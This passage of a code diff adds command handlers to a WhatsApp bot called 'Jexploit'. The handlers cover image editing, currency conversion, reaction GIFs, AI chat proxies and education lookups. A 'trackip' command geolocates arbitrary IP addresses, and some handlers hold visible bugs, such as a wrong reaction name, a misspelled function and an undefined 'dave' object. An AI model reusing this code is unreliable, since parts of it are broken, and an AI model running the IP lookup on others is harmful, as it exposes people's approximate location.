+        const reminiUrl = `https://apis.davidcyril.name.ng/remini?url=${encodeURIComponent(imageUrl)}`;
+        const response = await axios.get(reminiUrl, {
+            responseType: 'arraybuffer'
+        });
+        
+        // Send the enhanced image directly
+        await conn.sendMessage(m.chat, { 
+            image: Buffer.from(response.data), 
+            caption: "✅ *Image enhanced successfully!*" 
+        }, { quoted: m });
+        
+    } catch (error) {
+        console.error('Remini error:', error);
+        reply("❌ *An error occurred while enhancing the image.*");
+    }
+   
+}
+break
+case 'editimage':
+case 'imageedit':
+case 'nanobanana': {
+    if (!m.quoted) return reply(`Reply to an image with: ${prefix}editimage make her hair blue`);
+
+    const mime = m.quoted.mimetype || m.quoted.msg?.mimetype;
+    if (!/image/.test(mime)) return reply(`Please reply to an image.`);
+
+    const prompt = args.join(" ");
+    if (!prompt) return reply(`Example: ${prefix}editimage make her hair blue`);
+
+    try {
+        await reply(`Editing image with prompt: "${prompt}"...`);
+
+        // Use handleMediaUpload to upload image
+        const imageUrl = await handleMediaUpload(m.quoted, conn, mime);
+        
+        if (!imageUrl || imageUrl.includes('exceeds the limit')) {
+            return reply(`Failed to upload image. Try again.`);
+        }
+
+        const apiUrl = `https://apis.davidcyril.name.ng/nanobanana?url=${encodeURIComponent(imageUrl)}&prompt=${encodeURIComponent(prompt)}`;
+        const response = await axios.get(apiUrl);
+
+        if (!response.data?.success || !response.data?.result?.image) {
+            return reply(`Failed to edit image.`);
+        }
+
+        await conn.sendMessage(m.chat, {
+            image: { url: response.data.result.image },
+            caption: `✅ Edited: ${prompt}\n> ${global.wm}`
+        }, { quoted: m });
+
+    } catch (error) {
+        console.error('Edit image error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    
+}
+break
+case "currency":
+case "convert":
+case "cur": {
+    if (!text) return reply(`📌 *Currency Converter*\n\nUsage: ${prefix}convert <amount> <from> <to>\n\nExample:\n${prefix}convert 100 USD EUR\n${prefix}convert 50 GBP JPY\n${prefix}cur 1000 UGX KES`);
+
+    const args = text.trim().split(/\s+/);
+    if (args.length < 3) {
+        return reply(`❌ *Invalid format!*\n\nUsage: ${prefix}convert <amount> <from> <to>\n\nExample: ${prefix}convert 100 USD EUR`);
+    }
+
+    const amount = parseFloat(args[0]);
+    const from = args[1].toUpperCase();
+    const to = args[2].toUpperCase();
+
+    if (isNaN(amount)) {
+        return reply(`*Invalid amount!*\n\nPlease provide a valid number.\nExample: ${prefix}convert 100 USD EUR`);
+    }
+
+    try {
+        await reply(`*Converting ${amount} ${from} to ${to}...*`);
+
+        const apiUrl = `https://apis.davidcyril.name.ng/tools/convert?amount=${amount}&from=${from}&to=${to}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.success && response.data?.result) {
+            reply(`💱 *Currency Conversion*\n\n${response.data.result}`);
+        } else {
+            reply(`*Conversion failed!*\n\nPlease check the currency codes.\nExample: ${prefix}convert 100 USD EUR`);
+        }
+    } catch (error) {
+        console.error('Currency error:', error);
+        reply(`*Error converting currency.*\nPlease try again later.`);
+    }
+  
+}
+break
+case "currencies":
+case "curlist":
+case "listcur": {
+    if (!Access) return reply(mess.owner);
+    
+    try {
+        await reply("*Fetching currency list...*");
+        
+        const apiUrl = "https://apis.davidcyril.name.ng/tools/currencies";
+        const response = await axios.get(apiUrl);
+        
+        if (response.data?.success && response.data?.currencies) {
+            const currencies = response.data.currencies;
+            
+            // Format the list in chunks
+            let message = `💱 *SUPPORTED CURRENCIES*\n\n📊 *Total:* ${currencies.length} currencies\n\n`;
+            
+            // Group currencies in rows of 8
+            let line = "";
+            for (let i = 0; i < currencies.length; i++) {
+                line += `• ${currencies[i]}  `;
+                if ((i + 1) % 8 === 0 || i === currencies.length - 1) {
+                    message += line + "\n";
+                    line = "";
+                }
+            }
+            
+            message += `\n📌 *Usage:* ${prefix}convert <amount> <from> <to>\n📌 *Example:* ${prefix}convert 100 USD EUR`;
+            
+            // Send message (split if too long)
+            if (message.length > 4000) {
+                const parts = message.match(/[\s\S]{1,4000}/g);
+                for (const part of parts) {
+                    await reply(part);
+                }
+            } else {
+                await reply(message);
+            }
+        } else {
+            reply("*Failed to fetch currency list.*");
+        }
+    } catch (error) {
+        console.error('Currency list error:', error);
+        reply("*Error fetching currency list.*\nPlease try again later.");
+    }
+    
+}
+break
+case 'kiss':
+case 'cium':
+case 'beso':
+await fetchReactionImage({ conn, m, reply, command: 'kiss' });
+break;
+case "cry": {
+await fetchImageReaction({ conn, m, reply, command: 'cry' });
+}
+break
+case "blush": {
+await fetchReactionImage({ conn, m, reply, command: 'blush'});
+}
+break
+case 'dance': {
+await fetchReactionImage ({ conn, m, reply, command: 'dance'})
+}
+break
+case "kill": {
+await fetchReactionImage ({ conn, m, reply, command: 'kill'})
+}
+break
+case "hug": {
+await fetchReactionImage ({ conn, m, reply, command: 'kill'})
+}
+break
+case "kick3": {
+await fetchReactionImage ({ conn, m, reply, command: 'kick3'})
+}
+break
+case "slap": {
+await fetchReactionImage ({ conn, m, reply, command: 'slap'})
+}
+break
+case "happy": {
+await fetchReactionImage ({ conn, m, reply, command: 'happy'})
+}
+break
+case 'bully': {
+await fetchReactionImage ({ conn, m, reply, command: 'bully'})
+}
+break
+case "pat":
+case "headpat":
+case "pet":
+await fetchReactionImage({ conn, m, reply, command: 'pat' });
+break;
+case "poke":
+case "pokes":
+await fetchReactionImage({ conn, m, reply, command: 'poke' });
+break;
+case "smile":
+case "smiling":
+await fetchReactionImage({ conn, m, reply, command: 'smile' });
+break;
+case "wave":
+case "waving":
+case "bye":
+await fetchReactionImage({ conn, m, reply, command: 'wave' });
+break;
+case "cuddle":
+case "snuggle":
+await fetchReactionImage({ conn, m, reply, command: 'cuddle' });
+break;
+case "highfive":
+case "high-five":
+case "hi5":
+await fetchReactionImage({ conn, m, reply, command: 'highfive' });
+break;
+case "lick":
+await fetchReactionImage({ conn, m, reply, command: 'lick' });
+break;
+case "bite":
+case "biting":
+await fetchReactionImage({ conn, m, reply, command: 'bite' });
+break;
+case "glomp":
+case "tacklehug":
+await fetchReactionImage({ conn, m, reply, command: 'glomp' });
+break;
+case "bonk":
+case "hit":
+await fetchReactionImage({ conn, m, reply, command: 'bonk' });
+break;
+case "yeet":
+case "throw":
+await fetchReactionImage({ conn, m, reply, command: 'yeet' });
+break;
+case "smug":
+case "smirking":
+await fetchReactionImage({ conn, m, reply, command: 'smug' });
+break;
+case "nom":
+case "eat":
+await fetchReactionImage({ conn, m, reply, command: 'nom' });
+break;
+case "sleepy":
+case "sleep":
+await fetchReactionImage({ conn, m, reply, command: 'sleepy' });
+break;
+case "facepalm":
+case "palm":
+await fetchReactionImage({ conn, m, reply, command: 'facepalm' });
+break;
+case "wink":
+case "winking":
+await fetchReactionImage({ conn, m, reply, command: 'wink' });
+break;
+case "shy":
+case "shyness":
+await fetchReactionImage({ conn, m, reply, command: 'shy' });
+break;
+case "stare":
+case "staring":
+await fetchReactionImage({ conn, m, reply, command: 'stare' });
+break;
+case "thinking":
+case "think":
+await fetchReactionImage({ conn, m, reply, command: 'thinking' });
+break;
+case "shoot":
+case "gun":
+await fetchReactionImage({ conn, m, reply, command: 'shoot' });
+break;
+case "run":
+case "running":
+await fetchReactionImage({ conn, m, reply, command: 'run' });
+break;
+case "shrug":
+case "idk":
+await fetchReactionImage({ conn, m, reply, command: 'shrug' });
+break;
+case "panic":
+case "panicking":
+await fetchReactionImage({ conn, m, reply, command: 'panic' });
+break;
+case "tease":
+case "teasing":
+await fetchReactionImage({ conn, m, reply, command: 'tease' });
+break;
+case "shiver":
+case "cold":
+await fetchReactionImage({ conn, m, reply, command: 'shiver' });
+break;
+case "bored":
+case "boring":
+await fetchReactionImage({ conn, m, reply, command: 'bored' });
+break;
+case "scream":
+case "yell":
+await fetchReactionImage({ conn, m, reply, command: 'scream' });
+break;
+case "pout":
+case "sulking":
+await fetchReactionImage({ conn, m, reply, command: 'pout' });
+break;
+case "handhold":
+case "holdinghands":
+await fetchReactionImage({ conn, m, reply, command: 'handhold' });
+break;
+case "spank":
+case "spanking":
+await fetchReactionImage({ conn, m, reply, command: 'spank' });
+break;
+case "tickle":
+case "tickling":
+await fetchReactionImage({ conn, m, reply, command: 'tickle' });
+break;
+case "cringe":
+case "cringing":
+await fetchReactionImage({ conn, m, reply, command: 'cringe' });
+break;
+case "party":
+case "partying":
+await fetchReactionImage({ conn, m, reply, command: 'party' });
+break;
+case "celebrate":
+case "celebration":
+await fetchReactionImage({ conn, m, reply, command: 'celebrate' });
+break;
+case "generate": {
+if (!text) return reply(global.mess.notext);
+
+    const api3Url = `https://api.gurusensei.workers.dev/dream?prompt=${encodeURIComponent(text)}`;
+    try {
+      await conn.sendMessage(m.chat, { image: { url: api3Url } }, { quoted: m });
+    } catch (error) {
+      console.error('Error generating image:', error);
+      reply(mess.error);
+    }
+}
+break
+case 'gemini':
+case 'geminai':
+case 'gem':
+    if (!text) return reply("*Please provide a question. Example: `.gemini Explain quantum physics*`");
+    
+    try {
+        await reply("🤔 Thinking...");
+        
+        const response = await fetch(`${global.mess.siputzx}/api/ai/gemini?text=${encodeURIComponent(text)}&promptSystem=Act+as+a+helpful+assistant`);
+        const data = await response.json();
+        
+        if (!data.status || !data.data?.response) {
+            return reply("❌ Failed to get response from Gemini.");
+        }
+        
+        reply(data.data.response);
+        
+    } catch (error) {
+        console.error('Gemini error:', error);
+        reply("❌ Error communicating with Gemini AI.");
+    }
+    break;
+case 'glm':
+case 'glm47':
+case 'glmflash':
+    if (!text) return reply("*Please provide a question. Example: `.glm Introduction to JavaScript*`");
+    
+    try {
+        await reply("🤔 Thinking...");
+        
+        const response = await fetch(`${global.mess.siputzx}/api/ai/glm47flash?prompt=${encodeURIComponent(text)}&system=You+are+a+helpful+assistant&temperature=0.7`);
+        const data = await response.json();
+        
+        if (!data.status || !data.data?.response) {
+            return reply("*Failed to get response from GLM.*");
+        }
+        
+        reply(data.data.response);
+        
+    } catch (error) {
+        console.error('GLM error:', error);
+        reply("*Error communicating with GLM AI*.");
+    }
+    break;
+case 'phi2':
+case 'phiai':
+case 'phi':
+    if (!text) return reply("*Please provide a question. Example: `.phi2 How are you*`");
+    
+    try {
+        await reply("🤔 Thinking...");
+        
+        const response = await fetch(`${global.mess.siputzx}/api/ai/phi2?prompt=${encodeURIComponent(text)}&system=You+are+a+helpful+assistant&temperature=0.7`);
+        const data = await response.json();
+        
+        if (!data.status || !data.data?.response) {
+            return reply("*Failed to get response from PHI2*.");
+        }
+        
+        reply(data.data.response);
+        
+    } catch (error) {
+        console.error('PHI2 error:', error);
+        reply("*Error communicating with PHI2 AI*.");
+    }
+ 
+break
+case 'venice':
+case 'vai': {
+    await veniceAICommand(conn, m.chat, text, m);
+    break;
+}
+
+case 'mistral': {
+    await mistralAICommand(conn, m.chat, text, m);
+    break;
+}
+
+case 'perplexity': {
+    await perplexityAICommand(conn, m.chat, text, m);
+    break;
+}
+
+case 'bard': {
+    await bardAICommand(conn, m.chat, text, m);
+    break;
+}
+
+case 'gpt4nano':
+case 'gpt41nano': {
+    await gpt4NanoAICommand(conn, m.chat, text, m);
+    break;
+}
+
+case 'kelvinai': {
+    await kelvinAICommand(conn, m.chat, text, m);
+    break;
+}
+
+case 'claude': {
+    await claudeAICommand(conn, m.chat, text, m);
+    break;
+}
+case "math":
+case "simplify": {
+    if (!text) return reply(`*Math Helper*\n\nPlease provide a math expression or question to solve.\n\nExample:\n${prefix}math 1 + 1\n${prefix}math 2^8\n${prefix}math integral of x^2`);
+
+    const query = text.trim();
+    
+    await reply('Solving your math problem... Please wait...');
+    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+
+    try {
+        // Use the new API from global.api
+        const apiUrl = `${global.api}/education/maths?q=${encodeURIComponent(query)}`;
+        const response = await axios.get(apiUrl, { timeout: 15000 });
+
+        // Check response status
+        if (!response.data?.status) {
+            throw new Error('API returned error status');
+        }
+
+        const resultText = response.data.result;
+        if (!resultText) {
+            throw new Error('No result from API');
+        }
+
+        // Send the result directly
+        await conn.sendMessage(m.chat, {
+            text: `*Math Answer*\n\n${resultText}`,
+            contextInfo: {
+                externalAdReply: {
+                    title: `${global.botname} Math`,
+                    body: `Powered by Kelvin Tech`,
+                    thumbnail: peler, // Use existing thumbnail
+                    mediaType: 1,
+                    renderLargerThumbnail: false
+                }
+            }
+        }, { quoted: m });
+
+        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.error('Math API Error:', error.message);
+        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        reply('❌ Failed to solve your math problem. Please try again later.');
+    }
+    
+}
+break
+case "physics": {
+    if (!text) return reply(`*Physics Helper*\n\nPlease provide a physics question or concept to explain.\n\nExample:\n${prefix}physics What is Newton's first law?\n${prefix}physics F=ma explained`);
+
+    const query = text.trim();
+    
+    await reply('🔬 Solving your physics question... Please wait...');
+    await conn.sendMessage(m.chat, { react: { text: '⚛️', key: m.key } });
+
+    try {
+        // Use the new API from global.api
+        const apiUrl = `${global.api}/education/physics?q=${encodeURIComponent(query)}`;
+        const response = await axios.get(apiUrl, { timeout: 15000 });
+
+        // Check response status
+        if (!response.data?.status) {
+            throw new Error('API returned error status');
+        }
+
+        const resultText = response.data.result;
+        if (!resultText) {
+            throw new Error('No result from API');
+        }
+
+        // Send the result directly
+        await conn.sendMessage(m.chat, {
+            text: `⚛️ *Physics Answer*\n\n${resultText}`,
+            contextInfo: {
+                externalAdReply: {
+                    title: `${global.botname} Physics`,
+                    body: `Powered by ${global.ownername || 'Kelvin Tech'}`,
+                    thumbnail: peler, // Use existing thumbnail
+                    mediaType: 1,
+                    renderLargerThumbnail: false
+                }
+            }
+        }, { quoted: m });
+
+        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.error('Physics API Error:', error.message);
+        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        reply('❌ Failed to answer your physics question. Please try again later.');
+    }
+   
+}
+break
+case "chemistry":
+case "chem": {
+    if (!text) return reply(`*Chemistry Helper*\n\nPlease provide a chemistry question or concept to explain.\n\nExample:\n${prefix}chemistry What is H2O?\n${prefix}chem Periodic table explained\n${prefix}chemistry acid base reaction`);
+
+    const query = text.trim();
+    
+    await reply('🧪 Solving your chemistry question... Please wait...');
+    await conn.sendMessage(m.chat, { react: { text: '🧪', key: m.key } });
+
+    try {
+        // Use the new API from global.api
+        const apiUrl = `${global.api}/education/chemistry?q=${encodeURIComponent(query)}`;
+        const response = await axios.get(apiUrl, { timeout: 15000 });
+
+        // Check response status
+        if (!response.data?.status) {
+            throw new Error('API returned error status');
+        }
+
+        const resultText = response.data.result;
+        if (!resultText) {
+            throw new Error('No result from API');
+        }
+
+        // Send the result directly
+        await conn.sendMessage(m.chat, {
+            text: `*Chemistry Answer*\n\n${resultText}`,
+            contextInfo: {
+                externalAdReply: {
+                    title: `${global.botname} Chemistry`,
+                    body: `Powered by Kelvin Tech`,
+                    thumbnail: peler, // Use existing thumbnail
+                    mediaType: 1,
+                    renderLargerThumbnail: false
+                }
+            }
+        }, { quoted: m });
+
+        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.error('Chemistry API Error:', error.message);
+        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        reply('❌ Failed to answer your chemistry question. Please try again later.');
+    }
+   
+}
+break
+case 'dictionary': {
+    if (!text) return reply(`*Dictionary*\n\nPlease provide a word to define.\n\nExample:\n${prefix}dictionary cat\n${prefix}define hello\n${prefix}dict computer`);
+
+    const word = text.trim().toLowerCase();
+    
+    // Send processing message
+    await reply(`🔍 Searching definition for: *${word}*...`);
+    await conn.sendMessage(m.chat, { react: { text: '📖', key: m.key } });
+
+    try {
+        // Call the dictionary API
+        const apiUrl = `${global.api}/education/dictionary?q=${encodeURIComponent(word)}`;
+        const response = await axios.get(apiUrl, { timeout: 15000 });
+        
+        // Check response
+        if (!response.data?.status || !response.data?.result) {
+            throw new Error('Invalid API response');
+        }
+
+        const data = response.data.result;
+        
+        // Format the dictionary entry
+        let definitionText = `📖 *Dictionary: ${data.word}*\n\n`;
+        
+        // Add phonetics if available
+        if (data.phonetics && data.phonetics.length > 0) {
+            const pronunciation = data.phonetics.find(p => p.text) || data.phonetics[0];
+            if (pronunciation.text) {
+                definitionText += `🔊 *Pronunciation:* ${pronunciation.text}\n`;
+            }
+        }
+        
+        definitionText += `\n`;
+        
+        // Add meanings
+        if (data.meanings && data.meanings.length > 0) {
+            data.meanings.forEach((meaning, index) => {
+                definitionText += `*${meaning.partOfSpeech.toUpperCase()}*\n`;
+                
+                if (meaning.definitions && meaning.definitions.length > 0) {
+                    // Show first 3 definitions to avoid long messages
+                    meaning.definitions.slice(0, 3).forEach((def, i) => {
+                        definitionText += `${i+1}. ${def.definition}\n`;
+                        
+                        // Add example if available
+                        if (def.example) {
+                            definitionText += `   _\"${def.example}\"_\n`;
+                        }
+                    });
+                    
+                    if (meaning.definitions.length > 3) {
+                        definitionText += `   *+${meaning.definitions.length - 3} more definitions*\n`;
+                    }
+                }
+                
+                // Add synonyms if available
+                if (meaning.synonyms && meaning.synonyms.length > 0) {
+                    definitionText += `   *Synonyms:* ${meaning.synonyms.slice(0, 5).join(', ')}`;
+                    if (meaning.synonyms.length > 5) {
+                        definitionText += ` +${meaning.synonyms.length - 5} more`;
+                    }
+                    definitionText += `\n`;
+                }
+                
+                definitionText += `\n`;
+            });
+        }
+        
+        // Add source
+        if (data.sourceUrls && data.sourceUrls.length > 0) {
+            definitionText += `📚 *Source:* ${data.sourceUrls[0]}\n`;
+        }
+        
+        // Check if message is too long and truncate if needed
+        if (definitionText.length > 4000) {
+            definitionText = definitionText.substring(0, 4000) + '\n\n_...definition truncated (too long)_';
+        }
+
+        await conn.sendMessage(m.chat, { text: definitionText }, { quoted: m });
+        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.error('Dictionary API Error:', error.message);
+        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        
+        let errorMsg = `❌ Could not find definition for "*${word}*". `;
+        if (error.message.includes('timeout')) {
+            errorMsg += 'Request timed out.';
+        } else if (error.response?.status === 404) {
+            errorMsg = `❌ No definition found for "*${word}*". Please check the spelling.`;
+        } else {
+            errorMsg += 'Please try again later.';
+        }
+        reply(errorMsg);
+    }
+    break;
+}
+case 'poem':
+case 'randompoem': {
+    // Send processing message
+    await reply('Finding a random poem for you... Please wait...');
+    await conn.sendMessage(m.chat, { react: { text: '📖', key: m.key } });
+
+    try {
+        // the random poem API
+        const apiUrl = `${global.api}/education/randompoem`;
+        const response = await axios.get(apiUrl, { timeout: 15000 });
+        
+        // Check response
+        if (!response.data?.status || !response.data?.result) {
+            throw new Error('Invalid API response');
+        }
+
+        const poem = response.data.result;
+        
+        // Format the poem beautifully
+        let poemText = `📜 *${poem.title}*\n`;
+        poemText += `✍️ *by ${poem.author}*\n\n`;
+        
+        // Add the poem lines
+        if (poem.lines && poem.lines.length > 0) {
+            poemText += poem.lines.join('\n');
+        } else if (poem.fullText) {
+            poemText += poem.fullText;
+        }
+        
+        // Add line count at the bottom
+        if (poem.lineCount) {
+            poemText += `\n\n_━━━━━━━━━━━━━━_\n📊 *${poem.lineCount} lines*`;
+        }
+
+        await conn.sendMessage(m.chat, { text: poemText }, { quoted: m });
+        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.error('Random Poem API Error:', error.message);
+        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        
+        let errorMsg = '❌ Failed to fetch a random poem. ';
+        if (error.message.includes('timeout')) {
+            errorMsg += 'Request timed out.';
+        } else {
+            errorMsg += 'Please try again later.';
+        }
+        reply(errorMsg);
+    }
+    break;
+}
+case 'fruit':
+case 'fruitinfo': {
+    if (!text) return reply(`🍎 *Fruit Information*\n\nPlease provide a fruit name.\n\nExample:\n${prefix}fruit apple\n${prefix}fruitinfo banana\n${prefix}fruit orange`);
+
+    const fruitName = text.trim().toLowerCase();
+    
+    // Send processing message
+    await reply(`🔍 Searching for information about: *${fruitName}*...`);
+    await conn.sendMessage(m.chat, { react: { text: '🍊', key: m.key } });
+
+    try {
+        // Call the fruit API
+        const apiUrl = `${global.api}/education/fruit?q=${encodeURIComponent(fruitName)}`;
+        const response = await axios.get(apiUrl, { timeout: 10000 });
+        
+        // Check response
+        if (!response.data?.status || !response.data?.result) {
+            throw new Error('Invalid API response');
+        }
+
+        const fruit = response.data.result;
+        
+        // Format the fruit information
+        let fruitText = `🍎 *Fruit: ${fruit.name}*\n\n`;
+        fruitText += `📚 *Scientific Classification*\n`;
+        fruitText += `• Family: ${fruit.family || 'N/A'}\n`;
+        fruitText += `• Genus: ${fruit.genus || 'N/A'}\n`;
+        fruitText += `• Order: ${fruit.order || 'N/A'}\n\n`;
+        
+        // Add nutrition information if available
+        if (fruit.nutritions) {
+            fruitText += `*Nutrition Facts (per 100g)*\n`;
+            fruitText += `• Calories: ${fruit.nutritions.calories || 0} kcal\n`;
+            fruitText += `• Fat: ${fruit.nutritions.fat || 0}g\n`;
+            fruitText += `• Sugar: ${fruit.nutritions.sugar || 0}g\n`;
+            fruitText += `• Carbohydrates: ${fruit.nutritions.carbohydrates || 0}g\n`;
+            fruitText += `• Protein: ${fruit.nutritions.protein || 0}g\n`;
+        }
+
+        await conn.sendMessage(m.chat, { text: fruitText }, { quoted: m });
+        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.error('Fruit API Error:', error.message);
+        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        
+        let errorMsg = `❌ Could not find information for "${fruitName}". `;
+        if (error.message.includes('timeout')) {
+            errorMsg += 'Request timed out.';
+        } else if (error.response?.status === 404) {
+            errorMsg = `❌ No information found for "${fruitName}". Please check the spelling.`;
+        } else {
+            errorMsg += 'Please try again later.';
+        }
+        reply(errorMsg);
+    }
+    break;
+}
+case 'book':
+case 'booksearch': {
+    if (!text) return reply(`📚 *Book Search*\n\nPlease provide a book title to search.\n\nExample:\n${prefix}book a doll's house\n${prefix}booksearch harry potter\n${prefix}book moby dick`);
+
+    const query = text.trim();
+    
+    // Send processing message
+    await reply(`🔍 Searching for books: *${query}*...`);
+    await conn.sendMessage(m.chat, { react: { text: '📚', key: m.key } });
+
+    try {
+        // Call the book search API
+        const apiUrl = `${global.api}/education/booksearch?q=${encodeURIComponent(query)}`;
+        const response = await axios.get(apiUrl, { timeout: 15000 });
+        
+        // Check response
+        if (!response.data?.status || !response.data?.result || response.data.result.length === 0) {
+            throw new Error('No books found');
+        }
+
+        const books = response.data.result;
+        
+        // Format the results
+        let bookText = `📚 *Book Search Results for "${query}"*\n\n`;
+        bookText += `━━━━━━━━━━━━━━━━━━\n\n`;
+        
+        // Show first 3 books to avoid long messages
+        const maxBooks = Math.min(books.length, 3);
+        
+        for (let i = 0; i < maxBooks; i++) {
+            const book = books[i];
+            
+            bookText += `📖 *${i+1}. ${book.title}*\n`;
+            
+            // Add authors
+            if (book.authors && book.authors.length > 0) {
+                const authorNames = book.authors.map(a => a.name).join(', ');
+                bookText += `✍️ *Author:* ${authorNames}\n`;
+            }
+            
+            // Add brief summary (truncated)
+            if (book.summary) {
+                const shortSummary = book.summary.length > 200 
+                    ? book.summary.substring(0, 200) + '...' 
+                    : book.summary;
+                bookText += `📝 *Summary:* ${shortSummary}\n`;
+            }
+            
+            // key metadata
+            bookText += `📊 *Downloads:* ${book.downloadCount?.toLocaleString() || 0}\n`;
+            bookText += `🔤 *Language:* ${book.languages?.join(', ') || 'en'}\n`;
+            
+            if (book.subjects && book.subjects.length > 0) {
+                const subjects = book.subjects.slice(0, 2).join(' • ');
+                bookText += `🏷️ *Topics:* ${subjects}`;
+                if (book.subjects.length > 2) bookText += ` +${book.subjects.length - 2} more`;
+                bookText += `\n`;
+            }
+            
+            bookText += `\n━━━━━━━━━━━━━━━━━━\n\n`;
+        }
+        
+        if (books.length > 3) {
+            bookText += `_...and ${books.length - 3} more results. Search more specifically for detailed results._`;
+        }
+
+        await conn.sendMessage(m.chat, { text: bookText }, { quoted: m });
+        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.error('Book Search API Error:', error.message);
+        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        
+        let errorMsg = `❌ No books found for "${query}". `;
+        if (error.message.includes('timeout')) {
+            errorMsg = '❌ Request timed out. Please try again.';
+        } else if (error.message.includes('No books found')) {
+            errorMsg = `❌ No books found matching "${query}". Try a different title.`;
+        } else {
+            errorMsg += 'Please try again later.';
+        }
+        reply(errorMsg);
+    }
+    break;
+}
+case "helpers": {
+    const search = (args && args.length) ? args.join(" ").toLowerCase() : "";
+
+// Check if global.helpersList exists and is an array
+const helpersList = Array.isArray(global.mess.helpersList) ? global.mess.helpersList : [];
+
+const filtered = helpersList.filter(helper =>
+    helper && helper.country && (helper.country.toLowerCase().includes(search))
+);
+
+if (!filtered.length) {
+    return reply(`x No helper found for "${search}".\nTry using: *.helpers* to see all.`);
+}
+    filtered.sort((a, b) => (a.country || "").localeCompare(b.country || ""));
+
+    let text = `*🌍 Jexploit Verified Helpers*\n\n`;
+    filtered.forEach((helper, index) => {
+      text += `${index + 1}. ${helper.flag || ""} *${helper.country || "N/A"}*\n   • ${helper.name || "N/A"}: ${helper.number || "N/A"}\n\n`;
+    });
+
+    text += `✅ Jexploit Team\n`;
+    text += `📢 For more information and updates? Join our support group:\n👉 https://chat.whatsapp.com/LSbOiemulBC5eyiCrLcYub?mode=gi_t\n`;
+    text += `⚠️ Charges may apply depending on the service provided.`;
+
+    reply(text);
+}
+break
+case "flux": {
+   try {
+if (!text) return reply(`*Usage:* ${command} <prompt>\n\n*Example:* ${command} cat`);
+    
+
+    await reply('> *Jexploit ᴘʀᴏᴄᴇssɪɴɢ ɪᴍᴀɢᴇ...*');
+
+    const apiUrl = `https://apis.davidcyril.name.ng/flux?prompt=${encodeURIComponent(text)}`;
+
+    await conn.sendMessage(m.chat, { image: { url: apiUrl }, caption: `🎨 *FLUX IMAGE GENERATOR*\n\n📄 *PROMPT:* ${text}\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ Jexploit` }, { quoted: m });
+  } catch (error) {
+    console.error('Error in Flux command:', error);
+    reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
+      }
+}
+break
+case "toaudio": {
+const quoted = m.quoted ? m.quoted : null;
+  const mime = quoted?.mimetype || "";
+    if (!quoted) return reply('*Reply to a video to convert it to audio!*');
+    if (!/video/.test(mime)) return reply('*Only videos can be converted to audio!*');
+
+    try {
+      let buffer = await quoted.download();
+      let converted = await toAudio(buffer, 'mp4');
+
+      await conn.sendMessage(m.chat, { audio: converted.data, mimetype: 'audio/mpeg' }, { quoted: m });
+      await converted.delete();
+    } catch (e) {
+      console.error(e);
+      reply('*Failed to convert video to audio!*');
+    }
+}
+break
+case 'trackip': {
+if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
+try {
+let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());
+
+const formatIPInfo = (info) => {
+ return `
+*IP Information*
+• IP: ${info.ip || 'N/A'}
+• Success: ${info.success || 'N/A'}
+• Type: ${info.type || 'N/A'}
+• Continent: ${info.continent || 'N/A'}
+• Continent Code: ${info.continent_code || 'N/A'}
+• Country: ${info.country || 'N/A'}
+• Country Code: ${info.country_code || 'N/A'}
+• Region: ${info.region || 'N/A'}
+• Region Code: ${info.region_code || 'N/A'}
+• City: ${info.city || 'N/A'}
+• Latitude: ${info.latitude || 'N/A'}
+• Longitude: ${info.longitude || 'N/A'}
+• Is EU: ${info.is_eu ? 'Yes' : 'No'}
+• Postal: ${info.postal || 'N/A'}
+• Calling Code: ${info.calling_code || 'N/A'}
+• Capital: ${info.capital || 'N/A'}
+• Borders: ${info.borders || 'N/A'}
+• Flag:
+ - Image: ${info.flag?.img || 'N/A'}
+ - Emoji: ${info.flag?.emoji || 'N/A'}
+ - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
+• Connection:
+ - ASN: ${info.connection?.asn || 'N/A'}
+ - Organization: ${info.connection?.org || 'N/A'}
+ - ISP: ${info.connection?.isp || 'N/A'}
+ - Domain: ${info.connection?.domain || 'N/A'}
+• Timezone:
+ - ID: ${info.timezone?.id || 'N/A'}
+ - Abbreviation: ${info.timezone?.abbr || 'N/A'}
+ - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
+ - Offset: ${info.timezone?.offset || 'N/A'}
+ - UTC: ${info.timezone?.utc || 'N/A'}
+ - Current Time: ${info.timezone?.current_time || 'N/A'}
+`;
+};
+
+if (!res.success) throw new Error(`IP ${text} not found!`);
+await dave.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+await delay(2000);
+m.reply(formatIPInfo(res)); 
+} catch (e) { 
+m.reply(`Error: Unable to retrieve data for IP ${text}`);
+}
+}
+break    
+case "tts2": {
+  if(!text) return reply("`provide a query`");
+ reply(`processing your query`);
+  try {
+    let anu = `https://api.siputzx.my.id/api/tools/tts?text=${encodeURIComponent(text)}&voice=jv-ID-DimasNeural&rate=0%&pitch=0Hz&volume=0%`;
+    const response = await axios.get(anu, {
+      responseType: 'arraybuffer'
+    });
+    let buffer = response.data;
+
+    conn.sendMessage(m.chat, {
+      audio: buffer,
+      mimetype: "audio/mpeg",
+      mp3: true
+    })
+  } catch (err) {
